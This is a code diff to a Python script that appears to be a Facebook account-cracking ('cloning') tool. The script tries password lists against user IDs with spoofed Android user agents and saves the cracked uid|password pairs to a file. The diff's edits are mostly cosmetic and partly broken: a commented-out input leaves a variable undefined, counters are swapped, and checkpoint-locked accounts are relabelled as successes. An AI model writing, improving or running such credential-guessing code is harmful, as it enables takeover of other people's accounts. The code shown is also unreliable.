@@ -145,7 +145,7 @@ class Main:
 		#print("\033[1;32m [1] FOLLOW MY GITHUB  ACCOUNT   ")
 		#print("\033[1;91m [2] EXIT")
 		print("")
-		Baloch = input("\n\033[1;90m  Choose : \033[1;32m")
+		#Baloch = input("\n\033[1;90m  Choose : \033[1;32m")
 		if Baloch in ["", " "]:
 			exit()
 		elif Baloch in ["2", "02"]:
@@ -155,7 +155,7 @@ class Main:
 			#os.system("xdg-open https://github.com/MrDemon69  ")
 			print("")
 			time.sleep(3.0)
-			print("\033[1;90m    𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗔𝗣𝗣𝗥𝗢𝗩𝗔𝗟..... ")
+			#print("\033[1;90m    𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗔𝗣𝗣𝗥𝗢𝗩𝗔𝗟..... ")
 			print("")
 			#input("\n\033[1;31m TYPE FOLLOW  GITHUB NAME: \033[1;37m")
 			time.sleep(3.1)
@@ -203,9 +203,9 @@ class Main:
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("       \033[0;91m╔══════════════════╗")
-				print("       \x1b[1;91m║\033[0;92mFREE MODE ACTIVATE\x1b[1;91m║")
-				print("       \033[0;91m╚══════════════════╝")
+				print("   \033[0;91m╔══════════════════╗")
+				print("   \x1b[1;91m║\033[0;92mFREE MODE ACTIVATE\x1b[1;91m║")
+				print("   \033[0;91m╚══════════════════╝")
 				print("")
 				print("   \x1b[1;92m╔═════════════════════════════════════════════════╗")
 				print("   \x1b[1;92m║\033[0;92m[🔥] CLONING HAS  BEEN STARTED                   ║")
@@ -585,7 +585,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [MR.NAYAN]-->%s<=>%s <-> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [MR.NAYAN]-->%s<=>%s <-> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -608,9 +608,9 @@ class Main:
 				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-NAYAN.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;91m[NAYAN-CP] %s | %s\033[1;91m         "%(uid, pw))
+				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-NAYAN] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("NAYAN-CP.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-NAYAN.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1021,7 +1021,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 	])
 		sys.stdout.write(
-			"\r [MR.NAYAN]-->%s<=>%s <-> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
+			"\r [MR.NAYAN]-->%s<=>%s <-> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1044,9 +1044,9 @@ class Main:
 				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-NAYAN.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;91m[NAYAN-CP] %s | %s\033[1;91m         "%(uid, pw))
+				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-NAYAN] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("NAYAN-CP.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-NAYAN.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
